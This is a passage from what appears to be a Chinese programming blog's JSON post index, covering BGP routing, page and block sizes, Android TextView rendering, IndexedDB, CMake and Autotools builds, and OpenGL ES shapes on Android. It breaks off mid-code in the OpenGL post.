出了NAT网关，就从核心网到达了互联网。在网络世界，每一个运营商的网络成为自治系统AS。每个自治系统都有边界路由器，通过它和外面的世界建立联系。对于云平台来讲，它可以被称为Multihomed AS，有多个连接连到其他的AS，但是大多拒绝帮其他的AS传输包。例如一些大公司的网络。对于运营商来说，它可以被称为Transit AS，有多个连接连到其他的AS，并且可以帮助其他的AS传输包，比如主干网。如何从出口的运营商到达云平台的边界路由器？在路由器之间需要通过BGP协议实现，BGP又分为两类，eBGP和iBGP。自治系统间，边界路由器之间使用eBGP广播路由。内部网络也需要访问其他的自治系统。边界路由器如何将BGP学习到的路由导入到内部网络呢？通过运行iBGP，使内部的路由器能够找到到达外网目的地最好的边界路由器。网站的SLB的公网IP地址早已经通过云平台的边界路由器，让全网都知道了。于是这个下单的网络包选择了下一跳是A2，也即将A2的MAC地址放在目标MAC地址中。到达A2之后，从路由表中找到下一跳是路由器C1，于是将目标MAC换成C1的MAC地址。到达C1之后，找到下一跳是C2，将目标MAC地址设置为C2的MAC。到达C2后，找到下一跳是云平台的边界路由器，于是将目标MAC设置为边界路由器的MAC地址。你会发现，这一路，都是只换MAC，不换目标IP地址。这就是所谓下一跳的概念。在云平台的边界路由器，会将下单的包转发进来，经过核心交换，汇聚交换，到达外网网关节点上的SLB的公网IP地址。我们可以看到，手机到SLB的公网IP，是一个端到端的连接，连接的过程发送了很多包。所有这些包，无论是TCP三次握手，还是HTTPS的密钥交换，都是要走如此复杂的过程到达SLB的，当然每个包走的路径不一定一致。 UDPUDP的首部只有8个字节，12 字节的伪首部是为了计算检验和临时添加的。 参考TCP 报文结构tcp包结构推广商业软件的文章，当做关于tcp协议的一整个series来看还是很好的 HTTP幂等性(用CAS)避免下单两次 TCP端口状态说明ESTABLISHED、TIME_WAITFIN_WAIT2","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"page-size and block size","date":"2018-12-02T21:42:24.000Z","path":"2018/12/02/2018-12-02-page-size-and-block-size/","text":"page size（内存相关）和block size(文件系统相关)的一些点wiki上说Page size常由processor的架构决定的，操作系统管理内存的最小单位是一个Page size(应用程序申请分配内存时，操作系统实际分配的内存是page-size的整数倍) Block size vs. page size block size concerns storage space on a filesystem.Page size is, I believe, architecture-dependent, 4k being the size for IA-32 (x86) machines. For IA-64 architecture, I’m pretty sure you can set the page size at compile time, with 8k or 16k considered optimal. Again, I’m not positive, but I think Linux supports 4,8,16, and 64k pages.Block size is a function of the filesystem in use. Many, if not all filesystems allow you to choose the block size when you format, although for some filesystems the block size is tied to/dependent upon the page size.Minimun block size is usually 512 bytes, the allowed values being determined by the filesystem in question. unix系统中查看系统的page size getconf PAGESIZE ## X86架构的cpu上一般是4096byte 一个很有意思的现象是，java BufferedInputStream的默认buffer数组大小是8192，okio 的segment的默认size也是8192，这些都是以byte为单位的。找到一个合理的解释。大致意思是8192 = 2^13, windows和linux上这个大小正好占用两个分页文件(8kB)。 block size(硬盘块)摘抄一段来自深入浅出腾讯云CDN：缓存篇的话： 不管SSD盘或者SATA盘都有最小的操作单位，可能是512B，4KB，8KB。如果读写过程中不进行对齐，底层的硬件或者驱动就需要替应用层来做对齐操作，并将一次读写操作分裂为多次读写操作。 什么是内存对齐，为什么要对齐？ 现代计算机中内存空间都是按照 byte 划分的，从理论上讲似乎对任何类型的变量的访问可以从任何地址开始，但实际情况是在访问特定变量的时候经常在特定的内存地址访问，这就需要各类型数据按照一定的规则在空间上排列，而不是顺序的一个接一个的排放，这就是对齐。对齐的作用和原因：各个硬件平台对存储空间的处理上有很大的不同。一些平台对某些特定类型的数据只能从某些特定地址开始存取。其他平台可能没有这种情况，但是最常见的是如果不按照适合其平台的要求对数据存放进行对齐，会在存取效率上带来损失。比如有些平台每次读都是从偶地址开始，如果一个 int 型（假设为32位）如果存放在偶地址开始的地方，那么一个读周期就可以读出，而如果存放在奇地址开始的地方，就可能会需要 2 个读周期，并对两次读出的结果的高低字节进行拼凑才能得到该 int 数据。显然在读取效率上下降很多，这也是空间和时间的博弈。“内存对齐”应该是编译器的“管辖范围”。编译器为程序中的每个“数据单元”安排在适当的位置上。但是C语言的一个特点就是太灵活，太强大，它允许你干预“内存对齐” 对齐规则(内存相关)每个特定平台上的编译器都有自己默认的“对齐系数”，我们可以通过预处理指令#pragma pack(n), n=1, 2, 4, 8, 16…来改变这一系数，这个 n 就是对齐系数 数据成员对齐规则：结构(struct)或联合(union)的数据成员，第一个数据成员放在 offset 为 0 的地方，以后的每个数据成员的对齐按照#pragma pack(n)指定的 n 值和该数据成员本身的长度 len = sizeof(type) 中，较小的那个进行，如果没有显示指定n值，则以len为准，进行对齐结构/联合整体对齐规则：在数据成员对齐完成之后，结构/联合本身也要对齐，对齐按照#pragma pack(n)指定的n值和该结构/联合最大数据成员长度max_len_of_members中，较小的那个进行，如果没有显示指定n值，则以max_len_of_members为准，进行对齐结合1、2可推断：当n值均超过(或等于)所有数据成员的长度时，这个n值的大小将不产生任何效果 从fsize看block#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define N 1024 long fsize(FILE *fp){ fseek(fp, 0, SEEK_END); return ftell(fp); } int main(){ printf(&quot;enter the file absolute path: \\n &quot;); char str[N]; scanf(&quot;%s&quot;,str); printf(&quot;\\n the file name you choose is: %s\\n &quot;,str); FILE *fp = fopen(str, &quot;rb&quot;); if(fp == NULL ){ printf(&quot;error opening file \\n&quot;); exit(-1); } printf(&quot;len: %ld bytes\\n&quot;, fsize(fp)); fclose(fp); return 0; } 简单的一个用fsize函数获取文件的bytes数的函数 ./a.out sample.txt ## len: 2527 bytesdu sample.txt4 sample.txtdu -b sample.txt2527 sample.txt 简单的来说，fsize获取的大小和du的结果不一致。但du -b 就一样了。这事主要是因为block size的缘故,文件系统分配磁盘存储的时候是以block为单位的。所以经常看到windows里面显示一个文件的大小和“占用的磁盘空间”。就是因为block的原因。更详细的解释在这里 For files, ls -l file shows (among other things) the size of file in bytes, while du -k file shows the space occupied by file on disk (in units of 1 kB = 1204 bytes). Since disk space is allocated in blocks, the size indicated by du -k is always slightly larger than the space indicated by ls -kl (which is the same as ls -l, but in 1 kB units). For directories, ls -ld dir shows (among other things) the size of the list of filenames (together with a number of attributes) of the files and subdirectories in dir. This is just the list of filenames, not the files’ or subdirectories’ contents. So this size increases when you add files to dir (even when files are empty), but it stays unchanged when one of the files in dir grows. However, when you delete files from dir the space from the list is not reclaimed immediately, but rather the entries for deleted files are marked as unused, and are later recycled (this is actually implementation-dependent, but what I described is pretty much the universal behavior these days). That’s why you may not see any changes in ls -ld output when you delete files until much later, if ever. Finally, du -ks dir shows (an estimate of) the space occupied on disk by all files in dir, together with all files in all of dir’s subdirectories, in 1 kB = 1024 bytes units. Taking into account the description above, this has no relation whatsoever with the output of ls -kld dir. linux上是ext4文件系统应用程序调用read()方法，系统会通过中断从用户空间进入内核处理流程，然后经过VFS(Virtual File System，虚拟文件系统)、具体文件系统、页缓存Page Cache。VFS主要是用于实现屏蔽具体的文件系统，为应用程序的操作提供一个统一的接口。Page Cache(页缓存)，读文件的时候，会先看一下它是不是已经在Page Cache里面，如果命中了的话，就不会去读取磁盘。通过/proc/meminfo文件可以查看缓存的内存占用情况，当系统内存不足的时候，系统会回收这部分内存，I/O的性能就会降低。 这本应该是一篇关于操作系统原理，内核简介的文章,to be complemented 参考 [ ] Paging Technique : Memory management in Operating System 深入理解 ext4 等 Linux 文件系统 Linux 的 EXT4 文件系统的历史、特性以及最佳实践 https://zhuanlan.zhihu.com/p/52054044https://zhuanlan.zhihu.com/p/35879028","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"TextView测量及渲染原理","date":"2018-11-29T16:11:54.000Z","path":"2018/11/29/2018-11-29-how-is-text-drawn-on-android/","text":"Android上的TextView分为java层和native层，java层包括Layout,Paint,Canvasnative层包括各种开源库，Minikin,ICU,HarfBuzz,FreeType关于文字的形体,排版等信息是native层计算出来的。 [tbd] TextView是一个很重的控件，由于measure耗时通常很多，Android P提出了Precomputed Text的概念。类似的概念早几年instagram也提出过（如果只是想要展示一段文字，在一个子线程用Layout去计算。我碰到的情况是：layout.getDesiredwidth(“一个字”) &gt; layout.getDesiredwidth(“一”) + layout.getDesiredwidth(“个”)+ layout.getDesiredwidth(“字”)。多数情况下，左边的值和右边的width之和是相等的，但是出现中英文夹杂的时候左边会小于右边。不清楚这是否是提前换行的原因。 Layout有BoringLayout(一行文字),StaticLayout(多行文字)和DynamicLayout(文字会变)这三个子类 在某些版本的Android上，TextView碰到中英文夹杂的时候，会出现提前换行(普遍的看法是Layout这个类里面处理全角符号的时候算错了) ActivityThread里面有一个freeTextLayoutCachesIfNeeded方法 static void freeTextLayoutCachesIfNeeded(int configDiff) { if (configDiff != 0) { // Ask text layout engine to free its caches if there is a locale change boolean hasLocaleConfigChange = ((configDiff &amp; ActivityInfo.CONFIG_LOCALE) != 0); if (hasLocaleConfigChange) { Canvas.freeTextLayoutCaches(); if (DEBUG_CONFIGURATION) Slog.v(TAG, &quot;Cleared TextLayout Caches&quot;); } } } 参考Textview的高度ascent,descent这些的详细解说TextView预渲染研究instagram的文章Best practices for text on Android (Google I/O ‘18)Use Android Text Like a Pro (Android Dev Summit ‘18)","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"浏览器indexedDb使用示例","date":"2018-11-27T10:33:01.000Z","path":"2018/11/27/2018-11-27-indexed-db-tutorial/","text":"浏览器indexedDb使用方式及注意的点 浏览器上可供使用的数据持久化选择就这些 1) Store all data on server database (SQL or NoSQL)2) LocalStorage / SessionStorage - limited memory (around 5MB)3) WebSQL - it has been deprecated in favor of IndexedDB4) IndexedDB - designed as “one true” browser database with 50MB and moretl;dr Use some library from conclusion section to make your life easier. 一些重要的概念Database(通常一个app只有一个database)127.0.0.1:8080和127.0.0.1：8000 是两个不同的Application创建出来的数据库在Application-&gt;Storage-&gt;IndexedDB里面有 Object Stores(就像数据库里的table或者collections一样，但是同一个store中存储的数据类型不一定是相同的) transaction（所有对IndexDb的操作必须通过transaction） 接下来是CURD的实例 db.open返回的是一个IDBRequest对象，没有promise的方式是这样使用的 var db; // Let us open our database var DBOpenRequest = window.indexedDB.open(&quot;toDoList&quot;, 4); // these two event handlers act on the database being // opened successfully, or not DBOpenRequest.onerror = function(event) { note.innerHTML += &#39;&lt;li&gt;Error loading database.&lt;/li&gt;&#39;; }; DBOpenRequest.onsuccess = function(event) { note.innerHTML += &#39;&lt;li&gt;Database initialised.&lt;/li&gt;&#39;; // store the result of opening the database. db = DBOpenRequest.result; }; (Create)创建db的代码:indexedDB.open(‘db-name’, 1) //第二个参数是数据库版本 添加数据的方式function putSomeData() { let indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB let open = indexedDB.open(&#39;db-name&#39;, 1) open.onupgradeneeded = function() { let db = open.result db.createObjectStore(&#39;objectStoreName&#39;, { autoIncrement: true }) } open.onsuccess = function() { let db = open.result let tx = db.transaction(&#39;objectStoreName&#39;, &#39;readwrite&#39;) let store = tx.objectStore(&#39;objectStoreName&#39;) store.put({ firstname: &#39;John&#39;, lastname: &#39;Doe&#39;, age: 33 }) tx.oncomplete = function() { db.close() } } } 真啰嗦，还是用第三方库吧，用idb好了 async function putSomeData() { let db = await idb.open(&#39;db-name&#39;, 1, upgradeDB =&gt; upgradeDB.createObjectStore(&#39;objectStoreName&#39;, { autoIncrement: true })) let tx = db.transaction(&#39;objectStoreName&#39;, &#39;readwrite&#39;) let store = tx.objectStore(&#39;objectStoreName&#39;) await store.put({ firstname: &#39;John&#39;, lastname: &#39;Doe&#39;, age: 33 }) await tx.complete db.close() } async function getAllData() { let db = await idb.open(&#39;db-name&#39;, 1) let tx = db.transaction(&#39;objectStoreName&#39;, &#39;readonly&#39;) let store = tx.objectStore(&#39;objectStoreName&#39;) // add, clear, count, delete, get, getAll, getAllKeys, getKey, put let allSavedItems = await store.getAll() console.log(allSavedItems) db.close() } 扯一点关于存储的东西当浏览器进入私人模式(private browsing mode，Google Chrome 上对应的应该是叫隐身模式)的时候，会创建一个新的、临时的、空的数据库，用以存储本地数据(local storage data)。当浏览器关闭时，里面的所有数据都将被丢弃。 判断方式 //隐身模式下和localStorage满了都会报同样的错误 try { window.localStorage.setItem(&#39;test&#39;, &#39;test&#39;) } catch (e) { console.log(e) //QuotaExceddedError(DOM Exception 22):The quota has been exceeded. }","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"},{"name":"javaScript","slug":"javaScript","permalink":"https://haldir65.github.io/tags/javaScript/"}]},{"title":"cmake实用手册","date":"2018-11-26T13:42:16.000Z","path":"2018/11/26/2018-11-26-cmake-intro/","text":"当我们敲下cmake命令的时候，cmake会在当前目录下找CMakeLists.txt这个文件 CMake好在跨平台 你或许听过好几种 Make 工具，例如 GNU Make ，QT 的 qmake ，微软的 MS nmake，BSD Make（pmake），Makepp，等等。这些 Make 工具遵循着不同的规范和标准，所执行的 Makefile 格式也千差万别。这样就带来了一个严峻的问题：如果软件想跨平台，必须要保证能够在不同平台编译。而如果使用上面的 Make 工具，就得为每一种标准写一次 Makefile ，这将是一件让人抓狂的工作。就是针对上面问题所设计的工具：它首先允许开发者编写一种平台无关的 CMakeList.txt 文件来定制整个编译流程，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程。从而做到“Write once, run everywhere”。 下面就是最简单的一个CMakeLists.txt的例子，project(hello_cmake)是一个函数，该函数生成了PROJECT_NAME这个变量，所以下面直接用了。add_executable（）第一个参数是要生成的可执行文件的名字，第二个参数(其实可以包括所有编译需要的源文件) cmake_minimum_required(VERSION 3.5)project (hello_cmake)add_executable(${PROJECT_NAME} main.cpp) 这个更简单 cmake_minimum_required(VERSION 2.8)project(app_project)add_executable(myapp main.c)install(TARGETS myapp DESTINATION bin) 生成Makefilemkdir _build &amp;&amp; cd _build &amp;&amp; cmake .. -DCMAKE_INSTALL_PREFIX=../_install生成的Makefile拿来用:make &amp;&amp; make install省的手写Makefile了 cmake支持In-Place Build和Out-of-Source Build。前者是直接在当前文件夹（CMAKE_BINARY_DIR）中生成一大堆文件（太乱了），后者则是在一个指定的文件夹中生成文件。Out-of-source build其实很简单mkdir build &amp;&amp; cd build/ &amp;&amp; cmake .. (在build文件夹中会生成一个Makefile)make &amp;&amp; ./hello_cmake 一堆内置的变量供参考 Variable Info CMAKE_SOURCE_DIR The root source directory CMAKE_CURRENT_SOURCE_DIR The current source directory if using sub-projects and directories. PROJECT_SOURCE_DIR The source directory of the current cmake project. CMAKE_BINARY_DIR The root binary / build directory. This is the directory where you ran the cmake command. CMAKE_CURRENT_BINARY_DIR The build directory you are currently in. PROJECT_BINARY_DIR The build directory for the current project. header文件的处理可以指定多个源文件 set(SOURCES src/Hello.cpp src/main.cpp)add_executable(${PROJECT_NAME} ${SOURCES})//或者直接把src文件夹下面的所有.cpp文件加入进来file(GLOB SOURCES “src/*.cpp”) 对于include文件夹 target_include_directories(target PRIVATE ${PROJECT_SOURCE_DIR}/include)这样编译器就会在编译参数上加上-I/directory/path这种东西 static library的处理cmake_minimum_required(VERSION 3.5) project(hello_library) ############################################################ # Create a library ############################################################ #Generate the static library from the library sources add_library(hello_library STATIC src/Hello.cpp //创建一个libhello_library.a 的static library ) target_include_directories(hello_library PUBLIC ${PROJECT_SOURCE_DIR}/include ) ############################################################ # Create an executable ############################################################ # Add an executable with the above sources add_executable(hello_binary src/main.cpp ) # link the new hello_library target with the hello_binary target target_link_libraries( hello_binary PRIVATE hello_library ) shared library的处理cmake_minimum_required(VERSION 3.5) project(hello_library) ############################################################ # Create a library ############################################################ #Generate the shared library from the library sources add_library(hello_library SHARED src/Hello.cpp // 用传入该函数的文件创建一个 libhello_library.so Library ) add_library(hello::library ALIAS hello_library) target_include_directories(hello_library //hello_library需要这个include directory PUBLIC ${PROJECT_SOURCE_DIR}/include ) ############################################################ # Create an executable ############################################################ # Add an executable with the above sources add_executable(hello_binary src/main.cpp ) # link the new hello_library target with the hello_binary target target_link_libraries( hello_binary // 接下来就是Link了，这里使用了上面的一个alias PRIVATE hello::library ) 接下来是make install (将生成的可执行文件安装到系统中，似乎就是复制到/usr/bin里面)默认情况下cmake会把生成的可执行文件安装到系统中，我们可以指定安装到特定的位置cmake .. -DCMAKE_INSTALL_PREFIX=/install/location install (TARGETS cmake_examples_inst_bin DESTINATION bin) // target cmake_examples_inst_bin target to the destination ${CMAKE_INSTALL_PREFIX}/bin install (TARGETS cmake_examples_inst LIBRARY DESTINATION lib) //install the shared library generated from the target cmake_examples_inst target to the destination ${CMAKE_INSTALL_PREFIX}/lib $ ls /usr/local/bin/cmake_examples_inst_bin $ ls /usr/local/liblibcmake_examples_inst.so $ ls /usr/local/etc/cmake-examples.conf $ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib cmake_examples_inst_binHello Install! //把生成的bin文件复制到/sur/local/bin目录下，再修改LDPATH,就能去/usr/locallib这个目录去找生成的library了 Autoconf/Automake教程GNU Autotools 一般指的是3个 GNU 工具包：Autoconf，Automake 和 Libtool (本文先介绍前两个工具，Libtool留到今后介绍)它们能解决什么问题，要先从 GNU 开源软件的 Build 系统说起。一般来说。GNU 软件的安装过程都是： 解压源代码包./configuremakemake install（可能要切root用户）这个过程中， 需要有一个 configure 脚本，同时也需要一个 Makefile 文件。 而 Autoconf 和 Automake 就是一套自动生成 configure 脚本和 Makefile 文件的工具。 在ubuntu上安装autoconf,automake,libtool: sudo apt install build-essential autoconf automake libtool libtool-bin autotools-dev configure文件是用autoconf根据configure.ac创建出来的，而configure.ac能用autoscan自动创建出来 随便创建一个文件夹 $ lsepoch.c Makefile $ cat epoch.c #include &lt;stdio.h&gt; #include &lt;sys/time.h&gt; #include &lt;time.h&gt; #include &quot;config.h&quot; double get_epoch() { double sec; #ifdef HAVE_GETTIMEOFDAY struct timeval tv; gettimeofday(&amp;tv, NULL); sec = tv.tv_sec; sec += tv.tv_usec / 1000000.0; #else sec = time(NULL); #endif return sec; } int main(int argc, char* argv[]) { printf(&quot;%f\\n&quot;, get_epoch()); return 0; } 这么写的原因是gettimeofday()这个函数不是在所有的平台上都有，这种时候就要用time()函数了。 $ cat Makefile # Makefile: A standard Makefile for epoch.c all: epoch clean: rm ­f epoch 这样其实已经可以直接make生成可执行文件了。但是我们用autoconf来生成试一下 生成config.h文件config.h文件是configure命令根据config.h.in文件生成的，config.h.in文件是由autoheader（C的source code）中生成的（总之也是自动的）$ lsepoch.c Makefile$ autoscan$ lsautoscan.log configure.scan epoch.c Makefile$ mv configure.scan configure.ac$ lsautoscan.log configure.ac epoch.c Makefile$ autoheader$ lsautom4te.cache autoscan.log config.h.in configure.ac epoch.c Makefile$ mv Makefile Makefile.in$ autoconf$ lsautom4te.cache autoscan.log config.h.in configure configure.ac epoch.c Makefile.in$ ./configurechecking for gcc… gccchecking whether the C compiler works… yeschecking for C compiler default output file name… a.outchecking for suffix of executables…checking whether we are cross compiling… nochecking for suffix of object files… ochecking whether we are using the GNU C compiler… yeschecking whether gcc accepts -g… yeschecking for gcc option to accept ISO C89… none neededchecking how to run the C preprocessor… gcc -Echecking for grep that handles long lines and -e… /bin/grepchecking for egrep… /bin/grep -Echecking for ANSI C header files… yeschecking for sys/types.h… yeschecking for sys/stat.h… yeschecking for stdlib.h… yeschecking for string.h… yeschecking for memory.h… yeschecking for strings.h… yeschecking for inttypes.h… yeschecking for stdint.h… yeschecking for unistd.h… yeschecking sys/time.h usability… yeschecking sys/time.h presence… yeschecking for sys/time.h… yeschecking for gettimeofday… yesconfigure: creating ./config.statusconfig.status: creating Makefileconfig.status: creating config.h$ lsautom4te.cache autoscan.log config.h config.h.in config.log config.status configure configure.ac epoch.c Makefile Makefile.in$ make$ lsautom4te.cache config.h config.log configure epoch Makefileautoscan.log config.h.in config.status configure.ac epoch.c Makefile.in$ ./epoch1544345416.704451 //到此结束（这样做的意义在于一份代码就能够拥有多平台兼容性） 另一种方式手动创造“Makefile.am”文件$ cat Makefile.am Makefile.am for epoch.cbin_PROGRAMS=epochepoch_SOURCES=epoch.c $ lsepoch.c Makefile.am $ autoscan$ mv configure.scan configure.ac$ autoheader$ lsautom4te.cache autoscan.log config.h.in configure.ac epoch.c Makefile.am$ vim configure.ac改成这样 # -*- Autoconf -*- # Process this file with autoconf to produce a configure script. AC_PREREQ([2.69]) AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS]) AM_INIT_AUTOMAKE AC_CONFIG_SRCDIR([epoch.c]) AC_CONFIG_HEADERS([config.h]) # Checks for programs. AC_PROG_CC # Checks for libraries. # Checks for header files. AC_CHECK_HEADERS([sys/time.h]) # Checks for typedefs, structures, and compiler characteristics. AC_HEADER_TIME # Checks for library functions. AC_CHECK_FUNCS([gettimeofday]) AC_CONFIG_FILES([Makefile]) AC_OUTPUT 其实就是加了AM_INIT_AUTOMAKE这一行还有AC_HEADER_TIME$ aclocal$ automake ­­add­missing ­­copy$ autoconf$ ./configure 在这一步因为没有生成Makefile.in所以停下来了 参考cmake的教程，非常好Useful CMake Examples本文来自这里的实例autotools教程","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"C","slug":"C","permalink":"https://haldir65.github.io/tags/C/"}]},{"title":"opengl学习笔记","date":"2018-11-15T22:53:55.000Z","path":"2018/11/15/2018-11-15-opengl-related-topics/","text":"topics relating opengl stuff 本文多数代码来自这个系列 首先，不要学旧的版本。It is much better to start from the “modern” OpenGL versions: Learn OpenGL &gt;3.0. opengl device support on android OpenGL ES 1.0 &amp; 1.1 since Android 1.0 (API 4) OpenGL ES 2.0 since Android 2.2 (API 8) OpenGL ES 3.0 since Android 4.3 (API 18) (almost) OpenGL ES 3.1 since Android 5.0 (API 21) OpenGL ES is a variant of OpenGL’s specifications for embedded system. Graphics progamming for OpenGL ES 2.0 and 3.0 is largely similar, with version 3.0 representing a superset of the 2.0 API with additional features. Programming for the OpenGL ES 1.0/1.1 API versus OpenGL ES 2.0 and 3.0 differs significantly(2.0和3.0的语法差不多，3.0就是加了点特性。1.0和他俩的语法不同，不要学)总的来讲，2.0和3.0要比1.0的性能好，能够对硬件有更自由的掌控（the API provides a great deal of control over the graphics rendering pipeline.），但是语法要复杂些。 Android提供了很多用于和OPENGL环境交互的class开发者使用java环境 -&gt; 描述绘制图形 -&gt; graphics rendering pipeline最简单的View是GLSurfaceView，实现渲染的逻辑在GLSurfaceView.Renderer中。如果想要只在view的布局一部分中使用gl功能的请使用TextureView，For real, do-it-yourself developers, it is also possible to build up an OpenGL ES view using SurfaceView, but this requires writing quite a bit of additional code。 GLSurfaceView.Renderer public interface Renderer { void onSurfaceCreated(GL10 gl, EGLConfig config); void onSurfaceChanged(GL10 gl, int width, int height); void onDrawFrame(GL10 gl); } render就这么三个方法，这三个方法都在一条叫做GLThread的线程上被调用 检查当前设备的opengles版本:在GLSurfaceView.Renderer的onSurfaceCreated中添加 // Create a minimum supported OpenGL ES context, then check: String version = gl.glGetString(GL10.GL_VERSION); Log.w(TAG, &quot;Version: &quot; + version ); // The version format is displayed as: &quot;OpenGL ES &lt;major&gt;.&lt;minor&gt;&quot; // followed by optional content provided by the implementation. 我在一台5.1的设备上打印出来的是”OpenGL ES 3.1”这么几个字。 坐标系 By default, OpenGL ES assumes a coordinate system where [0,0,0] (X,Y,Z) specifies the center of the GLSurfaceView frame, [1,1,0] is the top right corner of the frame and [-1,-1,0] is bottom left corner of the frameopengl使用三维坐标系，右手坐标，屏幕中心为原点，z轴垂直于屏幕，往上是正数。屏幕中心往右走是x轴正轴，屏幕中心往上走是y轴正轴。 culling（就是告诉opengl完全忽略掉背面，不要浪费时间去渲染看不见的地方）Face culling is an option for the OpenGL environment which allows the rendering pipeline to ignore (not calculate or draw) the back face of a shape, saving time, memory and processing cycles:（好处就是节省时间和运算量）比方说完全忽略掉背面 // enable face culling feature gl.glEnable(GL10.GL_CULL_FACE); // specify which faces to not draw gl.glCullFace(GL10.GL_BACK); 还有，默认的作图顺序是逆时针的 Texture compression能够极大的节约内存，并充分利用内存带宽提升性能包括这么几个:ETC1 compression format(但不支持有alpha channel，就是带透明度的)The ETC2/EAC texture compression formats (支持带alpha channel) 查看当前设备支持的OpenGL extensions(entension就是标准之外的，部分厂商硬件支持的特性) // Get the list of extensions. String extensionList = GLES10.glGetString(GLES10.GL_EXTENSIONS); if (!TextUtils.isEmpty(extensionList)) { // The list of extensions comes from the driver separated by spaces. // Split them apart and add them into a Set for deduping purposes. for (String extension : extensionList.split(&quot; &quot;)) { glExtensions.add(extension); } } OpenGL ES 2.0过程及理解OpenGL ES 2.0渲染过程为：读取顶点数据——执行顶点着色器——组装图元——光栅化图元——执行片元着色器——写入帧缓冲区——显示到屏幕上。OpenGL作为本地库直接运行在硬件上，没有虚拟机，也没有垃圾回收或者内存压缩。在Java层定义图像的数据需要能被OpenGL存取，因此，需要把内存从Java堆复制到本地堆。顶点着色器是针对每个顶点都会执行的程序，是确定每个顶点的位置。同理，片元着色器是针对每个片元都会执行的程序，确定每个片元的颜色。着色器需要进行编译，然后链接到OpenGL程序中。一个OpenGL的程序就是把一个顶点着色器和一个片段着色器链接在一起变成单个对象。 定义shape点，线，三角形，这三个是opengl的图形基础，其他任何集合图形都可以用三角形拼凑出来。根据官方文档，开发者需要往opengl传一个float的array作为要绘制的对象的坐标，在java里用ArrayBuffer比较好(这部分内存是传到硬件层的)。官方文档上这样定义了一个三角形 public class Triangle { private FloatBuffer vertexBuffer; // number of coordinates per vertex in this array static final int COORDS_PER_VERTEX = 3; static float triangleCoords[] = { // in counterclockwise order: 0.0f, 0.622008459f, 0.0f, // top -0.5f, -0.311004243f, 0.0f, // bottom left 0.5f, -0.311004243f, 0.0f // bottom right }; //逆时针走向 // Set color with red, green, blue and alpha (opacity) values float color[] = { 0.63671875f, 0.76953125f, 0.22265625f, 1.0f }; public Triangle() { // initialize vertex byte buffer for shape coordinates ByteBuffer bb = ByteBuffer.allocateDirect( // (number of coordinate values * 4 bytes per float) triangleCoords.length * 4); // use the device hardware&#39;s native byte order bb.order(ByteOrder.nativeOrder()); //字节序 // create a floating point buffer from the ByteBuffer vertexBuffer = bb.asFloatBuffer(); // add the coordinates to the FloatBuffer vertexBuffer.put(triangleCoords); // set the buffer to read the first coordinate vertexBuffer.position(0); } } 正方形就可以由两个三角形拼在一起组成 public class Square { private FloatBuffer vertexBuffer; private ShortBuffer drawListBuffer; // number of coordinates per vertex in this array static final int COORDS_PER_VERTEX = 3; static float squareCoords[] = { -0.5f, 0.5f, 0.0f, // top left -0.5f, -0.5f, 0.0f, // bottom left 0.5f, -0.5f, 0.0f, // bottom right 0.5f, 0.5f, 0.0f }; // top right private short drawOrder[] = { 0, 1, 2, 0, 2, 3 }; // order to draw vertices public Square() { // initialize vertex byte buffer for shape coordinates ByteBuffer bb = ByteBuffer.allocateDirect( // (# of coordinate values * 4 bytes per float) squareCoords.length * 4); bb.order(ByteOrder.nativeOrder()); vertexBuffer = bb.asFloatBuffer(); vertexBuffer.put(squareCoords); vertexBuffer.position(0); // initialize byte buffer for the draw list ByteBuffer dlb = ByteBuffer.allocateDirect( // (# of coordinate values * 2 bytes per short) drawOrder.length * 2); dlb.order(ByteOrder.nativeOrder()); drawListBuffer = dlb.asShortBuffer(); drawListBuffer.put(drawOrder); drawListBuffer.position(0); } } 绘制定义的shape首先在onSurfaceCreated里面创建要绘制的shape对象 private Triangle mTriangle; private Square mSquare; public void onSurfaceCreated(GL10 unused, EGLConfig config) { ... // initialize a triangle mTriangle = new Triangle(); // initialize a square mSquare = new Square(); } 接下来就是比较麻烦的地方了，必须要定义这几样东西 Vertex Shader - OpenGL ES graphics code for rendering the vertices of a shape.（顶点着色器） Fragment Shader - OpenGL ES code for rendering the face of a shape with colors or textures.(片元着色器) Program - An OpenGL ES object that contains the shaders you want to use for drawing one or more shapes. 至少需要一个vertex shader去画shape，一个fragment shader去画shape的颜色，这俩被编译并添加到opengles program中，后者将被用来画这个shape public class Triangle { private final String vertexShaderCode = &quot;attribute vec4 vPosition;&quot; + &quot;void main() {&quot; + &quot; gl_Position = vPosition;&quot; + &quot;}&quot;; private final String fragmentShaderCode = &quot;precision mediump float;&quot; + &quot;uniform vec4 vColor;&quot; + &quot;void main() {&quot; + &quot; gl_FragColor = vColor;&quot; + &quot;}&quot;; ... } public static int loadShader(int type, String shaderCode){ // create a vertex shader type (GLES20.GL_VERTEX_SHADER) // or a fragment shader type (GLES20.GL_FRAGMENT_SHADER) int shader = GLES20.glCreateShader(type); // add the source code to the shader and compile it GLES20.glShaderSource(shader, shaderCode); GLES20.glCompileShader(shader); //编译shader并link program很耗费cpu，所以只要做一次，一般放在shape的构造函数里面 return shader; } 所以最后Triangle的代码变成这样 // number of coordinates per vertex in this array const val COORDS_PER_VERTEX = 3 var triangleCoords = floatArrayOf( // in counterclockwise order: 0.0f, 0.622008459f, 0.0f, // top -0.5f, -0.311004243f, 0.0f, // bottom left 0.5f, -0.311004243f, 0.0f // bottom right ) class Triangle { // Set color with red, green, blue and alpha (opacity) values val color = floatArrayOf(0.63671875f, 0.76953125f, 0.22265625f, 1.0f) private var vertexBuffer: FloatBuffer = // (number of coordinate values * 4 